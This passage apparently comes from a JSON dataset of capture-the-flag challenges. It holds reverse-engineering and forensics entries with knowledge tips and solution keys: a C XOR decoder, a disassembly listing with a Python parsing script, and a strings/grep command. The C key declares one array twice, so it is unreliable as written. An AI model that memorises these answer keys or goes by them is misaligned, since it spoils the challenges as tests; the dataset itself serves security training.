4,53,50,44,53,55,44,52,52,44,53,50,44,53,55,44,52,52,44,53,50,44,53,55,44,52,52,44,53,50,44,53,50,44,52,52,44,53,50,44,53,55,44,52,52,44,53,50,44,53,54,44,52,52,44,53,51,44,53,49,44,52,52,44,53,50,44,53,50,44,52,52,44,53,50,44,53,55,44,52,52,44,53,50,44,53,55,44,52,52,44,53,50,44,53,54,44,52,52,44,53,50,44,53,50,44,52,52,44,53,51,44,53,48,44,52,52,44,53,50,44,53,54,44,52,52,44,53,50,44,53,50,44,52,52,44,53,51,44,53,53,44,52,52,44,53,50,44,53,55,44,52,52,44,53,50,44,53,50,44,52,52,44,53,51,44,53,53,44,52,52,44,53,51,44,53,53,44,52,52,44,53,50,44,53,50,44,52,52,44,53,50,44,53,55,44,52,52,44,53,50,44,53,54,44,52,52,44,53,51,44,53,48,44,52,52,44,53,50,44,53,50,44,52,52,44,53,50,44,53,55,44,52,52,44,53,50,44,53,55,44,52,52,44,53,51,44,53,48,44,52,52,44,53,50,44,53,50,44,52,52,44,53,51,44,53,48,44,52,52,44,53,50,44,53,54,44,52,52,44,53,50,44,53,50,44,52,52,44,53,50,44,53,55,44,52,52,44,53,50,44,53,54,44,52,52,44,53,51,44,53,49,44,52,52,44,53,50,44,53,50,44,52,52,44,53,51,44,53,48,44,52,52,44,53,50,44,53,54,44,52,52,44,53,50,44,53,50,44,52,52,44,53,51,44,53,53,44,52,52,44,53,50,44,53,55,44,52,52,44,53,50,44,53,50,44,52,52,44,53,51,44,53,53,44,52,52,44,53,51,44,53,53,44,52,52,44,53,50,44,53,50,44,52,52,44,53,50,44,53,55,44,52,52,44,53,50,44,53,54,44,52,52,44,53,51,44,53,48,44,52,52,44,53,50,44,53,50,44,52,52,44,53,50,44,53,55,44,52,52,44,53,50,44,53,55,44,52,52,44,53,51,44,53,48,44,52,52,44,53,50,44,53,50,44,52,52,44,53,51,44,53,48,44,52,52,44,53,50,44,53,54,44,52,52,44,53,50,44,53,50,44,52,52,44,53,50,44,53,55,44,52,52,44,53,50,44,53,54,44,52,52,44,53,51,44,53,49,44,52,52,44,53,50,44,53,50,44,52,52,44,53,51,44,53,48,44,52,52,44,53,50,44,53,54,44,52,52,44,53,50,44,53,50,44,52,52,44,53,51,44,53,53,44,52,52,44,53,50,44,53,55,44,52,52,44,53,50,44,53,50,44,52,52,44,53,51,44,53,53,44,52,52,44,53,51,44,53,53,44,52,52,44,53,50,44,53,50,44,52,52,44,53,50,44,53,55,44,52,52,44,53,50,44,53,54,44,52,52,44,53,51,44,53,48,44,52,52,44,53,50,44,53,50,44,52,52,44,53,50,44,53,55,44,52,52,44,53,50,44,53,55,44,52,52,44,53,51,44,53,48,44,52,52,44,53,50,44,53,50,44,52,52,44,53,51,44,53,48,44,52,52,44,53,50,44,53,54,44,52,52,44,53,50,44,53,50,44,52,52,44,53,50,44,53,55,44,52,52,44,53,50,44,53,54,44,52,52,44,53,51,44,53,49,44,52,52,44,53,50,44,53,50,44,52,52,44,53,51,44,53,48,44,52,52,44,53,50,44,53,54,44,52,52,44,53,50,44,53,50,44,52,52,44,53,51,44,53,53,44,52,52,44,53,50,44,53,55,44,52,52,44,53,50,44,53,50,44,52,52,44,53,51,44,53,53,44,52,52,44,53,51,44,53,53,44,52,52,44,53,50,44,53,50,44,52,52,44,53,50,44,53,55,44,52,52,44,53,50,44,53,54,44,52,52,44,53,51,44,53,48,44,52,52,44,53,50,44,53,50,44,52,52,44,53,50,44,53,55,44,52,52,44,53,50,44,53,55,44,52,52,44,53,51,44,53,48,44,52,52,44,53,50,44,53,50,44,52,52,44,53,51,44,53,48,44,52,52,44,53,50,44,53,54,44,52,52,44,53,50,44,53,50,44,52,52,44,53,50,44,53,55,44,52,52,44,53,50,44,53,54,44,52,52,44,53,51,44,53,49,44,52,52,44,53,50,44,53,50,44,52,52,44,53,51,44,53,48,44,52,52,44,53,50,44,53,54,44,52,52,44,53,50,44,53,50,44,52,52,44,53,51,44,53,53,44,52,52,44,53,50,44,53,55,44,52,52,44,53,50,44,53,50,44,52,52,44,53,51,44,53,53,44,52,52,44,53,51,44,53,53,44,52,52,44,53,50,44,53,50,44,52,52,44,53,50,44,53,55,44,52,52,44,53,50,44,53,54,44,52,52,44,53,51,44,53,48,44,52,52,44,53,50,44,53,50,44,52,52,44,53,50,44,53,55,44,52,52,44,53,50,44,53,55,44,52,52,44,53,51,44,53,48,44,52,52,44,53,50,44,53,50,44,52,52,44,53,51,44,53,48,44,52,52,44,53,50,44,53,54,44,52,52,44,53,50,44,53,50,44,52,52,44,53,50,44,53,55,44,52,52,44,53,50,44,53,54,44,52,52,44,53,51,44,53,49,44,52,52,44,53,50,44,53,50,44,52,52,44,53,51,44,53,48,44,52,52,44,53,50,44,53,54,44,52,52,44,53,50,44,53,50,44,52,52,44,53,51,44,53,53,44,52,52,44,53,50,44,53,55,44,52,52,44,53,50,44,53,50,44,52,52,44,53,51,44,53,53,44,52,52,44,53,51,44,53,53,44,52,52,44,53,50,44,53,50,44,52,52,44,53,50,44,53,55,44,52,52,44,53,50,44,53,54,44,52,52,44,53,51,44,53,48,44,52,52,44,53,50,44,53,50,44,52,52,44,53,50,44,53,55,44,52,52,44,53,50,44,53,55,44,52,52,44,53,51,44,53,48,44,52,52,44,53,50,44,53,50,44,52,52,44,53,51,44,53,48,44,52,52,44,53,50,44,53,54,44,52,52,44,53,50,44,53,50,44,52,52,44,53,50,44,53,55,44,52,52,44,53,50,44,53,54,44,52,52,44,53,51,44,53,49,44,52,52,44,53,50,44,53,50,44,52,52,44,53,51,44,53,48,44,52,52,44,53,50,44,53,54,44,52,52,44,53,50,44,53,50,44,52,52,44,53,51,44,53,53,44,52,52,44,53,50,44,53,55,44,52,52,44,53,50,44,53,50,44,52,52,44,53,51,44,53,53,44,52,52,44,53,51,44,53,53,44,52,52,44,53,50,44,53,50,44,52,52,44,53,50,44,53,55,44,52,52,44,53,50,44,53,54,44,52,52,44,53,51,44,53,48,44,52,52,44,53,50,44,53,50,44,52,52,44,53,50,44,53,55,44,52,52,44,53,50,44,53,55,44,52,52,44,53,51,44,53,48,44,52,52,44,53,50,44,53,50,44,52,52,44,53,51,44,53,48,44,52,52,44,53,50,44,53,54,44,52,52,44,53,50,44,53,50,44,52,52,44,53,50,44,53,55,44,52,52,44,53,50,44,53,54,44,52,52,44,53,51,44,53,49,44,52,52,44,53,50,44,53,50,44,52,52,44,53,51,44,53,48,44,52,52,44,53,50,44,53,54,44,52,52,44,53,50,44,53,50,44,52,52,44,53,51,44,53,53,44,52,52,44,53,50,44,53,55,44,52,52,44,53,50,44,53,50,44,52,52,44,53,51,44,53,53,44,52,52,44,53,51,44,53,53,44,52,52,44,53,50,44,53,50,44,52,52,44,53,50,44,53,55,44,52,52,44,53,50,44,53,54,44,52,52,44,53,51,44,53,48,44,52,52,44,53,50,44,53,50,44,52,52,44,53,50,44,53,55,44,52,52,44,53,50,44,53,55,44,52,52,44,53,51,44,53,48,44,52,52,44,53,50,44,53,50,44,52,52,44,53,51,44,53,48,44,52,52,44,53,50,44,53,54,44,52,52,44,53,50,44,53,50,44,52,52,44,53,50,44,53,55,44,52,52,44,53,50,44,53,54,44,52,52,44,53,51,44,53,49,44,52,52,44,53,50,44,53,50,44,52,52,44,53,51,44,53,48,44,52,52,44,53,50,44,53,54,44,52,52,44,53,50,44,53,50,44,52,52,44,53,51,44,53,53,44,52,52,44,53,50,44,53,55,44,52,52,44,53,50,44,53,50,44,52,52,44,53,51,44,53,53,44,52,52,44,53,51,44,53,53,44,52,52,44,53,50,44,53,50,44,52,52,44,53,50,44,53,55,44,52,52,44,53,50,44,53,54,44,52,52,44,53,51,44,53,48,44,52,52,44,53,50,44,53,50,44,52,52,44,53,50,44,53,55,44,52,52,44,53,50,44,53,55,44,52,52,44,53,51,44,53,48,44,52,52,44,53,50,44,53,50,44,52,52,44,53,51,44,53,48,44,52,52,44,53,50,44,53,54,44,52,52,44,53,50,44,53,50,44,52,52,44,53,50,44,53,55,44,52,52,44,53,50,44,53,54,44,52,52,44,53,51,44,53,49,44,52,52,44,53,50,44,53,50,44,52,52,44,53,51,44,53,48,44,52,52,44,53,50,44,53,54,44,52,52,44,53,50,44,53,50,44,52,52,44,53,51,44,53,53,44,52,52,44,53,50,44,53,55,44,52,52,44,53,50,44,53,50,44,52,52,44,53,51,44,53,53,44,52,52,44,53,51,44,53,53,44,52,52,44,53,50,44,53,50,44,52,52,44,53,50,44,53,55,44,52,52,44,53,50,44,53,54,44,52,52,44,53,51,44,53,48,44,52,52,44,53,50,44,53,50,44,52,52,44,53,50,44,53,55,44,52,52,44,53,50,44,53,55,44,52,52,44,53,51,44,53,48,44,52,52,44,53,50,44,53,50,44,52,52,44,53,51,44,53,48,44,52,52,44,53,50,44,53,54,44,52,52,44,53,50,44,53,50,44,52,52,44,53,50,44,53,55,44,52,52,44,53,50,44,53,54,44,52,52,44,53,51,44,53,49,44,52,52,44,53,50,44,53,50,44,52,52,44,53,51,44,53,48,44,52,52,44,53,50,44,53,54,44,52,52,44,53,50,44,53,50,44,52,52,44,53,51,44,53,53,44,52,52,44,53,50,44,53,55,44,52,52,44,53,50,44,53,50,44,52,52,44,53,51,44,53,53,44,52,52,44,53,51,44,53,53,44,52,52,44,53,50,44,53,50,44,52,52,44,53,50,44,53,55,44,52,52,44,53,50,44,53,54,44,52,52,44,53,51,44,53,48,44,52,52,44,53,50,44,53,50,44,52,52,44,53,50,44,53,55,44,52,52,44,53,50,44,53,55,44,52,52,44,53,51,44,53,48,44,52,52,44,53,50,44,53,50,44,52,52,44,53,51,44,53,48,44,52,52,44,53,50,44,53,54,44,52,52,44,53,50,44,53,50,44,52,52,44,53,50,44,53,55,44,52,52,44,53,50,44,53,54,44,52,52,44,53,51,44,53,49,44,52,52,44,53,50,44,53,50,44,52,52,44,53,51,44,53,48,44,52,52,44,53,50,44,53,54,44,52,52,44,53,50,44,53,50,44,52,52,44,53,51,44,53,53,44,52,52,44,53,50,44,53,55,44,52,52,44,53,50,44,53,50,44,52,52,44,53,51,44,53,53,44,52,52,44,53,51,44,53,53,44,52,52,44,53,50,44,53,50,44,52,52,44,53,50,44,53,55,44,52,52,44,53,50,44,53,54,44,52,52,44,53,51,44,53,48,44,52,52,44,53,50,44,53,50,44,52,52,44,53,50,44,53,55,44,52,52,44,53,50,44,53,55,44,52,52,44,53,51,44,53,48,44,52,52,44,53,50,44,53,50,44,52,52,44,53,51,44,53,48,44,52,52,44,53,50,44,53,54,44,52,52,44,53,50,44,53,50,44,52,52,44,53,50,44,53,55,44,52,52,44,53,50,44,53,54,44,52,52,44,53,51,44,53,49,44,52,52,44,53,50,44,53,50,44,52,52,44,53,51,44,53,48,44,52,52,44,53,50,44,53,54,44,52,52,44,53,50,44,53,50,44,52,52,44,53,51,44,53,53,44,52,52,44,53,50,44,53,55,44,52,52,44,53,50,44,53,50,44,52,52,44,53,51,44,53,53,44,52,52,44,53,51,44,53,53,44,52,52,44,53,50,44,53,50,44,52,52,44,53,50,44,53,55,44,52,52,44,53,50,44,53,54,44,52,52,44,53,51,44,53,48,44,52,52,44,53,50,44,53,50,44,52,52,44,53,50,44,53,55,44,52,52,44,53,50,44,53,55,44,52,52,44,53,51,44,53,48,44,52,52,44,53,50,44,53,50,44,52,52,44,53,51,44,53,48,44,52,52,44,53,50,44,53,54,44,52,52,44,53,50,44,53,50,44,52,52,44,53,50,44,53,55,44,52,52,44,53,50,44,53,54,44,52,52,44,53,51,44,53,49,44,52,52,44,53,50,44,53,50,44,52,52,44,53,51,44,53,48,44,52,52,44,53,50,44,53,54,44,52,52,44,53,50,44,53,50,44,52,52,44,53,51,44,53,53,44,52,52,44,53,50,44,53,55,44,52,52,44,53,50,44,53,50,44,52,52,44,53,51,44,53,53,44,52,52,44,53,51,44,53,53,44,52,52,44,53,50,44,53,50,44,52,52,44,53,50,44,53,55,44,52,52,44,53,50,44,53,54,44,52,52,44,53,51,44,53,48,44,52,52,44,53,50,44,53,50,44,52,52,44,53,50,44,53,55,44,52,52,44,53,50,44,53,55,44,52,52,44,53,51,44,53,48,44,52,52,44,53,50,44,53,50,44,52,52,44,53,51,44,53,48,44,52,52,44,53,50,44,53,54,44,52,52,44,53,50,44,53,50,44,52,52,44,53,50,44,53,55,44,52,52,44,53,50,44,53,54,44,52,52,44,53,51,44,53,49,44,52,52,44,53,50,44,53,50,44,52,52,44,53,51,44,53,48,44,52,52,44,53,50,44,53,54,44,52,52,44,53,50,44,53,50,44,52,52,44,53,51,44,53,53,44,52,52,44,53,50,44,53,55,44,52,52,44,53,50,44,53,50,44,52,52,44,53,51,44,53,53,44,52,52,44,53,51,44,53,53,44,52,52,44,53,50,44,53,50,44,52,52,44,53,50,44,53,55,44,52,52,44,53,50,44,53,54,44,52,52,44,53,51,44,53,48,44,52,52,44,53,50,44,53,50,44,52,52,44,53,50,44,53,55,44,52,52,44,53,50,44,53,55,44,52,52,44,53,51,44,53,48,44,52,52,44,53,50,44,53,50,44,52,52,44,53,51,44,53,48,44,52,52,44,53,50,44,53,54,44,52,52,44,53,50,44,53,50,44,52,52,44,53,50,44,53,55,44,52,52,44,53,50,44,53,54,44,52,52,44,53,51,44,53,49,44,52,52,44,53,50,44,53,50,44,52,52,44,53,51,44,53,48,44,52,52,44,53,50,44,53,54,44,52,52,44,53,50,44,53,50,44,52,52,44,53,51,44,53,53,44,52,52,44,53,50,44,53,55,44,52,52,44,53,50,44,53,50,44,52,52,44,53,51,44,53,53,44,52,52,44,53,51,44,53,53,44,52,52,44,53,50,44,53,50,44,52,52,44,53,50,44,53,55,44,52,52,44,53,50,44,53,54,44,52,52,44,53,51,44,53,48,44,52,52,44,53,50,44,53,50,44,52,52,44,53,50,44,53,55,44,52,52,44,53,50,44,53,55,44,52,52,44,53,51,44,53,48,44,52,52,44,53,50,44,53,50,44,52,52,44,53,51,44,53,48,44,52,52,44,53,50,44,53,54,44,52,52,44,53,50,44,53,50,44,52,52,44,53,50,44,53,55,44,52,52,44,53,50,44,53,54,44,52,52,44,53,51,44,53,49,44,52,52,44,53,50,44,53,50,44,52,52,44,53,51,44,53,48,44,52,52,44,53,50,44,53,54,44,52,52,44,53,50,44,53,50,44,52,52,44,53,51,44,53,53,44,52,52,44,53,50,44,53,55,44,52,52,44,53,50,44,53,50,44,52,52,44,53,51,44,53,53,44,52,52,44,53,51,44,53,53,44,52,52,44,53,50,44,53,50,44,52,52,44,53,50,44,53,55,44,52,52,44,53,50,44,53,54,44,52,52,44,53,51,44,53,48,44,52,52,44,53,50,44,53,50,44,52,52,44,53,50,44,53,55,44,52,52,44,53,50,44,53,55,44,52,52,44,53,51,44,53,48,44,52,52,44,53,50,44,53,50,44,52,52,44,53,51,44,53,48,44,52,52,44,53,50,44,53,54,44,52,52,44,53,50,44,53,50,44,52,52,44,53,50,44,53,55,44,52,52,44,53,50,44,53,54,44,52,52,44,53,51,44,53,49,44,52,52,44,53,50,44,53,50,44,52,52,44,53,51,44,53,48,44,52,52,44,53,50,44,53,54,44,52,52,44,53,50,44,53,50,44,52,52,44,53,51,44,53,53,44,52,52,44,53,50,44,53,55,44,52,52,44,53,50,44,53,50,44,52,52,44,53,51,44,53,53,44,52,52,44,53,51,44,53,53,44,52,52,44,53,50,44,53,50,44,52,52,44,53,50,44,53,55,44,52,52,44,53,50,44,53,54,44,52,52,44,53,51,44,53,48,44,52,52,44,53,50,44,53,50,44,52,52,44,53,50,44,53,55,44,52,52,44,53,50,44,53,55,44,52,52,44,53,51,44,53,48,44,52,52,44,53,50,44,53,50,44,52,52,44,53,51,44,53,48,44,52,52,44,53,50,44,53,54,44,52,52,44,53,50,44,53,50,44,52,52,44,53,50,44,53,55,44,52,52,44,53,50,44,53,54,44,52,52,44,53,51,44,53,49,44,52,52,44,53,50,44,53,50,44,52,52,44,53,51,44,53,48,44,52,52,44,53,50,44,53,54,44,52,52,44,53,50,44,53,50,44,52,52,44,53,51,44,53,53,44,52,52,44,53,50,44,53,55,44,52,52,44,53,50,44,53,50,44,52,52,44,53,51,44,53,53,44,52,52,44,53,51,44,53,53,44,52,52,44,53,50,44,53,50,44,52,52,44,53,50,44,53,55,44,52,52,44,53,50,44,53,54,44,52,52,44,53,51,44,53,48,44,52,52,44,53,50,44,53,50,44,52,52,44,53,50,44,53,55,44,52,52,44,53,50,44,53,55,44,52,52,44,53,51,44,53,48,44,52,52,44,53,50,44,53,50,44,52,52,44,53,51,44,53,48,44,52,52,44,53,50,44,53,54,44,52,52,44,53,50,44,53,50,44,52,52,44,53,50,44,53,55,44,52,52,44,53,50,44,53,54,44,52,52,44,53,51,44,53,49,44,52,52,44,53,50,44,53,50,44,52,52,44,53,51,44,53,48,44,52,52,44,53,50,44,53,54,44,52,52,44,53,50,44,53,50,44,52,52,44,53,51,44,53,53,44,52,52,44,53,50,44,53,55,44,52,52,44,53,50,44,53,50,44,52,52,44,53,51,44,53,53,44,52,52,44,53,51,44,53,53,44,52,52,44,53,50,44,53,50,44,52,52,44,53,50,44,53,55,44,52,52,44,53,50,44,53,54,44,52,52,44,53,51,44,53,48,44,52,52,44,53,50,44,53,50,44,52,52,44,53,50,44,53,55,44,52,52,44,53,50,44,53,55,44,52,52,44,53,51,44,53,48,44,52,52,44,53,50,44,53,50,44,52,52,44,53,51,44,53,48,44,52,52,"
    },
    {
        "name": "rev_Loading",
        "write_up": "dataset/raw/rev_Loading.md",
        "type": "The type of this CTF challenge is reverse.",
        "competition": [
            "LIT/2021",
            "https://ctftime.org/event/1398/tasks/"
        ],
        "score": -1.0,
        "max_score": 500,
        "difficulty": -1,
        "knowledge": [
            "When analyzing binary programs for vulnerabilities or hidden functionalities, loops that perform a large number of iterations can often be simplified for analysis. If the loop is primarily responsible for modifying data in a predictable and repetitive manner, calculate the total number of iterations needed to complete all data transformations. This approach is particularly useful when the loop modifies data based on the iteration count in a cyclic pattern.",
            "Data necessary for decryption or key generation embedded within a binary can sometimes be found in plaintext or in a slightly obfuscated form. In challenges involving encrypted or obfuscated data, examine the binary's data segments and strings for potential keys, passphrases, or patterns. This is essential when the program uses these embedded strings to manipulate or transform data (such as generating a flag). \n\nSample of payload to simplify the process based on the provided write-up:  \n```\nflag[i % LENGTH] ^= key[i % KEY_LENGTH];  \n```\nThis simplification assumes `LENGTH` is the size of the flag array and `KEY_LENGTH` is the size of the key used to encode or decode the flag, with `i` iterating through the number of required transformations derived from the analysis."
        ],
        "key": "```c\n#include <stdio.h>  \nint main(void) {  \n\tlong big_counter; char flag[57];  \n\tchar flag[57] = {48, 2, 4, 2, 28, 92, 86, 87, 93, 99, 31, 93, 65, 28, 88, 91, 79, 38, 84, 91, 20, 84, 110, 104, 37, 127, 9, 66, 81, 1, 44, 59, 13, 67, 84, 58, 82, 19, 84, 112, 81, 80, 46, 86, 28, 15, 102, 20, 6, 103, 94, 19, 60, 69, 73, 49, 2};  \n\tchar orz[172] = {'N', 'e', 'v', 'e', 'r', ' ', 'g', 'o', 'n', 'n', 'a', ' ', 'g', 'i', 'v', 'e', ' ', 'y', 'o', 'u', ' ', 'u', 'p', ' ', 'N', 'e', 'v', 'e', 'r', ' ', 'g', 'o', 'n', 'n', 'a', ' ', 'l', 'e', 't', ' ', 'y', 'o', 'u', ' ', 'd', 'o', 'w', 'n', ' ', 'N', 'e', 'v', 'e', 'r', ' ', 'g', 'o', 'n', 'n', 'a', ' ', 'r', 'u', 'n', ' ', 'a', 'r', 'o', 'u', 'n', 'd', ' ', 'a', 'n', 'd', ' ', 'd', 'e', 's', 'e', 'r', 't', ' ', 'y', 'o', 'u', ' ', 'N', 'e', 'v', 'e', 'r', ' ', 'g', 'o', 'n', 'n', 'a', ' ', 'm', 'a', 'k', 'e', ' ', 'y', 'o', 'u', ' ', 'c', 'r', 'y', ' ', 'N', 'e', 'v', 'e', 'r', ' ', 'g', 'o', 'n', 'n', 'a', ' ', 's', 'a', 'y', ' ', 'g', 'o', 'o', 'd', 'b', 'y', 'e', ' ', 'N', 'e', 'v', 'e', 'r', ' ', 'g', 'o', 'n', 'n', 'a', ' ', 't', 'e', 'l', 'l', ' ', 'a', ' ', 'l', 'i', 'e', ' ', 'a', 'n', 'd', ' ', 'h', 'u', 'r', 't', ' ', 'y', 'o', 'u','\\0'};  \n\tbig_counter = 0;  \n\twhile (big_counter < 9747) {  \n\t\tflag[big_counter % 0x39] ^= orz[big_counter % 0xab];  \n\t\tbig_counter = big_counter + 1;  \n\t}   \n\tprintf(\"%s\\n\",flag);  \n\treturn 0;  \n}  \n```"
    },
    {
        "name": "rev_Trampoline",
        "write_up": "dataset/raw/rev_Trampoline.md",
        "type": "The type of challenge is \"reverse\".",
        "competition": [
            "LIT/2021",
            "https://ctftime.org/event/1398/tasks/"
        ],
        "score": -1.0,
        "max_score": 500,
        "difficulty": -1,
        "knowledge": [
            "When facing obfuscated binary challenges in which direct static analysis tools (like Ghidra) fail to decompile the code due to complex control flows or an extensive number of branches, resorting to manual disassembly analysis can provide crucial insights. Specifically, patterns of instructions (e.g., `DEC` and `INC` operations) can be linked to the logic of the program, such as determining characters in a flag by the number of operations performed before a control flow change (like a jump).",
            "In binary reverse engineering challenges, where the objective is to deduce a string or flag from assembly code, a script can be efficiently used to parse disassembly to automate the extraction process. This involves identifying patterns that directly relate to the ASCII values of characters (for instance, the count of decrement (`DEC`) instructions before an increment (`INC`) instruction that signifies the end of a segment) and converting these patterns into their character equivalents to reconstruct the flag.\n\nSample Script to Automate Extraction:\n```python\ndec_list = []\ndec = 0\nfor line in fat.split('\\n'):\n    if 'DEC' in line:\n        dec += 1\n    else:\n        if dec > 0:\n            print(f'DEC ENDS HERE {dec} NUMBER OF DECS')\n            dec_list.append(dec)\n        dec = 0\nprint(''.join([chr(x) for x in dec_list]))\n```\nThis script could be used to automate the parsing of certain disassembly patterns to recover obfuscated strings or flags based on the number of specific assembly instructions (like `DEC` operations) observed before hitting a control flow instruction or NOP sled (`INC` operations followed by multiple `NOP`s), indicating the end of a meaningful code sequence."
        ],
        "key": "```assembly\nLAB_00106b44                                    XREF[1]:     00106b38(*)    \n       00106b44 48 ff c8        DEC        RAX  \n       00106b47 48 ff c8        DEC        RAX  \n       00106b4a 48 ff c8        DEC        RAX  \n       00106b4d 48 ff c8        DEC        RAX  \n       00106b50 48 ff c8        DEC        RAX  \n       00106b53 48 ff c8        DEC        RAX  \n       00106b56 48 ff c8        DEC        RAX  \n       00106b59 48 ff c8        DEC        RAX  \n       00106b5c 48 ff c8        DEC        RAX  \n       00106b5f 48 ff c8        DEC        RAX  \n       00106b62 48 ff c8        DEC        RAX  \n       00106b65 48 ff c8        DEC        RAX  \n       00106b68 48 ff c8        DEC        RAX  \n       00106b6b 48 ff c8        DEC        RAX  \n       00106b6e 48 ff c8        DEC        RAX  \n       00106b71 48 ff c8        DEC        RAX  \n       00106b74 48 ff c8        DEC        RAX  \n       00106b77 48 ff c8        DEC        RAX  \n       00106b7a 48 ff c8        DEC        RAX  \n       00106b7d 48 ff c8        DEC        RAX  \n       00106b80 48 ff c8        DEC        RAX  \n       00106b83 48 ff c8        DEC        RAX  \n       00106b86 48 ff c8        DEC        RAX  \n       00106b89 48 ff c8        DEC        RAX  \n       00106b8c 48 ff c8        DEC        RAX  \n       00106b8f 48 ff c8        DEC        RAX  \n       00106b92 48 ff c8        DEC        RAX  \n       00106b95 48 ff c8        DEC        RAX  \n       00106b98 48 ff c8        DEC        RAX  \n       00106b9b 48 ff c8        DEC        RAX  \n       00106b9e 48 ff c8        DEC        RAX  \n       00106ba1 48 ff c8        DEC        RAX  \n       00106ba4 48 ff c8        DEC        RAX  \n       00106ba7 48 ff c8        DEC        RAX  \n       00106baa 48 ff c8        DEC        RAX  \n       00106bad 48 ff c8        DEC        RAX  \n       00106bb0 48 ff c8        DEC        RAX  \n       00106bb3 48 ff c8        DEC        RAX  \n       00106bb6 48 ff c8        DEC        RAX  \n       00106bb9 48 ff c8        DEC        RAX  \n       00106bbc 48 ff c8        DEC        RAX  \n       00106bbf 48 ff c8        DEC        RAX  \n       00106bc2 48 ff c8        DEC        RAX  \n       00106bc5 48 ff c8        DEC        RAX  \n       00106bc8 48 ff c8        DEC        RAX  \n       00106bcb 48 ff c8        DEC        RAX  \n       00106bce 48 ff c8        DEC        RAX  \n       00106bd1 48 ff c8        DEC        RAX  \n       00106bd4 48 ff c8        DEC        RAX  \n       00106bd7 48 ff c8        DEC        RAX  \n       00106bda 48 ff c8        DEC        RAX  \n       00106bdd 48 ff c8        DEC        RAX  \n       00106be0 48 ff c8        DEC        RAX  \n       00106be3 48 ff c8        DEC        RAX  \n       00106be6 48 ff c8        DEC        RAX  \n       00106be9 48 ff c8        DEC        RAX  \n       00106bec 48 ff c8        DEC        RAX  \n       00106bef 48 ff c8        DEC        RAX  \n       00106bf2 48 ff c8        DEC        RAX  \n       00106bf5 48 ff c8        DEC        RAX  \n       00106bf8 48 ff c8        DEC        RAX  \n       00106bfb 48 ff c8        DEC        RAX  \n       00106bfe 48 ff c8        DEC        RAX  \n       00106c01 48 ff c8        DEC        RAX  \n       00106c04 48 ff c8        DEC        RAX  \n       00106c07 48 ff c8        DEC        RAX  \n       00106c0a 48 ff c8        DEC        RAX  \n       00106c0d 48 ff c8        DEC        RAX  \n       00106c10 48 ff c8        DEC        RAX  \n       00106c13 48 ff c8        DEC        RAX  \n       00106c16 48 ff c8        DEC        RAX  \n       00106c19 48 ff c8        DEC        RAX  \n       00106c1c 48 ff c8        DEC        RAX  \n       00106c1f 48 ff c8        DEC        RAX  \n       00106c22 48 ff c8        DEC        RAX  \n       00106c25 48 ff c8        DEC        RAX  \n       00106c28 48 ff c8        DEC        RAX  \n       00106c2b 48 ff c8        DEC        RAX  \n       00106c2e 48 ff c8        DEC        RAX  \n       00106c31 48 ff c8        DEC        RAX  \n       00106c34 48 ff c8        DEC        RAX  \n       00106c37 48 ff c8        DEC        RAX  \n       00106c3a 48 ff c8        DEC        RAX  \n       00106c3d 48 ff c8        DEC        RAX  \n       00106c40 48 ff c8        DEC        RAX  \n       00106c43 48 ff c8        DEC        RAX  \n       00106c46 48 ff c8        DEC        RAX  \n       00106c49 48 ff c8        DEC        RAX  \n       00106c4c 48 ff c8        DEC        RAX  \n       00106c4f 48 ff c8        DEC        RAX  \n       00106c52 48 ff c8        DEC        RAX  \n       00106c55 48 ff c8        DEC        RAX  \n       00106c58 48 ff c8        DEC        RAX  \n       00106c5b 48 ff c8        DEC        RAX  \n       00106c5e 48 ff c8        DEC        RAX  \n       00106c61 48 ff c8        DEC        RAX  \n       00106c64 48 ff c8        DEC        RAX  \n       00106c67 48 ff c8        DEC        RAX  \n       00106c6a 48 ff c8        DEC        RAX  \n       00106c6d 48 ff c8        DEC        RAX  \n       00106c70 48 ff c8        DEC        RAX  \n       00106c73 48 ff c8        DEC        RAX  \n       00106c76 48 ff c8        DEC        RAX  \n       00106c79 48 ff c8        DEC        RAX  \n       00106c7c 48 ff c8        DEC        RAX  \n       00106c7f 48 ff c8        DEC        RAX  \n       00106c82 48 ff c8        DEC        RAX  \n       00106c85 48 ff c8        DEC        RAX  \n       00106c88 48 ff c8        DEC        RAX  \n       00106c8b 48 ff c8        DEC        RAX  \n       00106c8e 48 ff c0        INC        RAX  \n       00106c91 0f 1f c0        NOP        EAX  \n       00106c94 0f 1f c0        NOP        EAX  \n       00106c97 0f 1f c0        NOP        EAX  \n       00106c9a 0f 1f c0        NOP        EAX  \n       00106c9d 0f 1f c0        NOP        EAX  \n       00106ca0 0f 1f c0        NOP        EAX  \n       00106ca3 0f 1f c0        NOP        EAX  \n       00106ca6 0f 1f c0        NOP        EAX  \n       00106ca9 0f 1f c0        NOP        EAX  \n       00106cac 0f 1f c0        NOP        EAX  \n       00106caf 0f 1f c0        NOP        EAX  \n       00106cb2 0f 1f c0        NOP        EAX  \n       00106cb5 0f 1f c0        NOP        EAX  \n       00106cb8 0f 1f c0        NOP        EAX  \n       00106cbb 0f 1f c0        NOP        EAX  \n       00106cbe 0f 1f c0        NOP        EAX  \n       00106cc1 0f 1f c0        NOP        EAX  \n       00106cc4 48 89 45 f8     MOV        qword ptr [RBP + -0x8],RAX  \n       00106cc8 48 31 c0        XOR        RAX,RAX  \n       00106ccb 8a 07           MOV        AL,byte ptr [RDI]  \n       00106ccd 48 ff c7        INC        RDI  \n       00106cd0 ba 03 00        MOV        EDX,0x3  \n                00 00  \n       00106cd5 48 f7 e2        MUL        RDX  \n       00106cd8 48 89 c1        MOV        RCX,RAX  \n       00106cdb 48 8b 45 f8     MOV        RAX,qword ptr [RBP + -0x8]  \n       00106cdf 48 8d 15        LEA        RDX,[LAB_00106ceb]  \n                05 00 00 00  \n       00106ce6 48 01 d1        ADD        RCX,RDX  \n       00106ce9 ff e1           JMP        RCX  \n```"
    },
    {
        "name": "Rewind",
        "write_up": "dataset/raw/Rewind.md",
        "type": "forensics",
        "competition": [
            "CSAW/2018/Quals",
            "https://ctftime.org/event/633/tasks/"
        ],
        "score": 150,
        "max_score": 1285,
        "difficulty": 0.11673151750972763,
        "knowledge": [
            "For forensics challenges involving examining disk images or memory dumps, use tools like `strings` to quickly search for plaintext patterns common in flags (e.g., \"flag{\"). This method can rapidly identify if sensitive or flag-related data is available in plaintext without the need for deeper forensic analysis. Example command: `strings disk.img | grep \"flag{\"`.",
            "When a CTF challenge mentions or implies the use of virtual machine snapshots or recordings (like QEMU's replay feature), investigate the possibility that the challenge's solution involves replaying or analyzing these VM interactions to uncover the flag. This may require familiarity with specific virtualization tools and their capabilities for recording and replaying user interactions and system events."
        ],
